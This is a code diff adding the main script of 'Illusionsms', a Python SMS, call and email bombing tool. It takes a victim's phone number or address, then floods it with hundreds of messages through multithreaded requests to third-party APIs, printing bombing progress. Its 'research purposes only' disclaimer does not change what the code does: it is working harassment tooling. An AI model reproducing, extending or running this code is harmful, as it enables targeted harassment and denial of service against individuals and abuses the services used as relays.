+    mesgdcrt.SuccessMessage("Illusionsms was created by IlluzX")
+
+
+def workernode(mode, cc, target, count, delay, max_threads):
+
+    api = APIProvider(cc, target, mode, delay=delay)
+    clr()
+    mesgdcrt.SectionMessage("Gearing up the Spammer - Please be patient")
+    mesgdcrt.GeneralMessage(
+        "Please stay connected to the internet during bombing")
+    mesgdcrt.GeneralMessage("API Version   : " + api.api_version)
+    mesgdcrt.GeneralMessage("Target        : " + cc + target)
+    mesgdcrt.GeneralMessage("Amount        : " + str(count))
+    mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
+    mesgdcrt.GeneralMessage("Delay         : " + str(delay) +
+                            " seconds")
+    mesgdcrt.WarningMessage(
+        "This tool was made for fun and research purposes only")
+    print()
+    input(mesgdcrt.CommandMessage(
+        "Press [CTRL+Z] to suspend the Spammer or [ENTER] to resume it"))
+
+    if len(APIProvider.api_providers) == 0:
+        mesgdcrt.FailureMessage("Your country/target is not supported yet")
+        mesgdcrt.GeneralMessage("Feel free to reach out to us")
+        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
+        bann_text()
+        sys.exit()
+
+    success, failed = 0, 0
+    while success < count:
+        with ThreadPoolExecutor(max_workers=max_threads) as executor:
+            jobs = []
+            for i in range(count-success):
+                jobs.append(executor.submit(api.hit))
+
+            for job in as_completed(jobs):
+                result = job.result()
+                if result is None:
+                    mesgdcrt.FailureMessage(
+                        "Bombing limit for your target has been reached")
+                    mesgdcrt.GeneralMessage("Try Again Later !!")
+                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
+                    bann_text()
+                    sys.exit()
+                if result:
+                    success += 1
+                else:
+                    failed += 1
+                clr()
+                pretty_print(cc, target, success, failed)
+    print("\n")
+    mesgdcrt.SuccessMessage("Bombing completed!")
+    time.sleep(1.5)
+    bann_text()
+    sys.exit()
+
+
+def selectnode(mode="sms"):
+    mode = mode.lower().strip()
+    try:
+        clr()
+        bann_text()
+        check_intr()
+        check_for_updates()
+        notifyen()
+
+        max_limit = {"sms": 500, "call": 15, "mail": 200}
+        cc, target = "", ""
+        if mode in ["sms", "call"]:
+            cc, target = get_phone_info()
+            if cc != "91":
+                max_limit.update({"sms": 100})
+        elif mode == "mail":
+            target = get_mail_info()
+        else:
+            raise KeyboardInterrupt
+
+        limit = max_limit[mode]
+        while True:
+            try:
+                message = ("Enter number of {type}".format(type=mode.upper()) +
+                           " to send (Max {limit}): ".format(limit=limit))
+                count = int(input(mesgdcrt.CommandMessage(message)).strip())
+                if count > limit or count == 0:
+                    mesgdcrt.WarningMessage("You have requested " + str(count)
+                                            + " {type}".format(
+                                                type=mode.upper()))
+                    mesgdcrt.GeneralMessage(
+                        "Automatically capping the value"
+                        " to {limit}".format(limit=limit))
+                    count = limit
+                delay = float(input(
+                    mesgdcrt.CommandMessage("Enter delay time (in seconds): "))
+                    .strip())
+                # delay = 0
+                max_thread_limit = (count//10) if (count//10) > 0 else 1
+                max_threads = int(input(
+                    mesgdcrt.CommandMessage(
+                        "Enter Number of Thread (Recommended: {max_limit}): "
+                        .format(max_limit=max_thread_limit)))
+                    .strip())
+                max_threads = max_threads if (
+                    max_threads > 0) else max_thread_limit
+                if (count < 0 or delay < 0):
+                    raise Exception
+                break
+            except KeyboardInterrupt as ki:
+                raise ki
+            except Exception:
+                mesgdcrt.FailureMessage("Read Instructions Carefully !!!")
+                print()
+
+        workernode(mode, cc, target, count, delay, max_threads)
     except KeyboardInterrupt:
-        print(f"\n{C.YELLOW}[!] Exiting...{C.RESET}")
-    except Exception as e:
-        print(f"\n{C.RED}[✗] Fatal error: {e}{C.RESET}")
-        sys.exit(1)
+        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
+        sys.exit()
+
+
+mesgdcrt = MessageDecorator("icon")
+if sys.version_info[0] != 3:
+    mesgdcrt.FailureMessage("Illusionsms will work only in Python v3")
+    sys.exit()
+
+try:
+    country_codes = readisdc()["isdcodes"]
+except FileNotFoundError:
+    update()
+
+
+__VERSION__ = get_version()
+__CONTRIBUTORS__ = ['Illyas_ibrahim', 'R447H', 'Robert', 'Rosh']
+
+ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE,
+              Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
+RESET_ALL = Style.RESET_ALL
+
+ASCII_MODE = True
+DEBUG_MODE = False
+
+description = """Illusionsms - Your Friendly Spammer Application
+
+Illusionsms can be used for many purposes which incudes -
+\t Exposing the vulnerable APIs over Internet
+\t Friendly Spamming
+\t Testing Your Spam Detector and more ....
+
+Illusionsms is not intented for malicious uses.
+"""
+
+parser = argparse.ArgumentParser(description=description,
+                                 epilog='Coded by IlluzX !!!')
+parser.add_argument("-sms", "--sms", action="store_true",
+                    help="start Illusionsms with SMS Bomb mode")
+parser.add_argument("-call", "--call", action="store_true",
+                    help="start Illusionsms with CALL Bomb mode")
+parser.add_argument("-mail", "--mail", action="store_true",
+                    help="start Illusionsms with MAIL Bomb mode")
+parser.add_argument("-ascii", "--ascii", action="store_true",
+                    help="show only characters of standard ASCII set")
+parser.add_argument("-u", "--update", action="store_true",
+                    help="update Illusionsms")
+parser.add_argument("-c", "--contributors", action="store_true",
+                    help="show current Illusionsms contributors")
+parser.add_argument("-v", "--version", action="store_true",
+                    help="show current Illusionsms version")
+
+
+if __name__ == "__main__":
+    args = parser.parse_args()
+    if args.ascii:
+        ASCII_MODE = True
+        mesgdcrt = MessageDecorator("stat")
+    if args.version:
+        print("Version: ", __VERSION__)
+    elif args.contributors:
+        print("Contributors: ", " ".join(__CONTRIBUTORS__))
+    elif args.update:
+        update()
+    elif args.mail:
+        selectnode(mode="mail")
+    elif args.call:
+        selectnode(mode="call")
+    elif args.sms:
+        selectnode(mode="sms")
+    else:
+        choice = ""
+        avail_choice = {
+            "1": "SMS",
+            "2": "CALL",
+            "3": "MAIL"
+        }
+        try:
+            while (choice not in avail_choice):
+                clr()
+                bann_text()
+                print("Available Options:\n")
+                for key, value in avail_choice.items():
+                    print("[ {key} ] {value} BOMB".format(key=key,
+                                                          value=value))
+                print()
+                choice = input(mesgdcrt.CommandMessage("Enter Choice : "))
+            selectnode(mode=avail_choice[choice].lower())
+        except KeyboardInterrupt:
+            mesgdcrt.WarningMessage("Received INTR call - Exiting...")
+            sys.exit()
+    sys.exit()
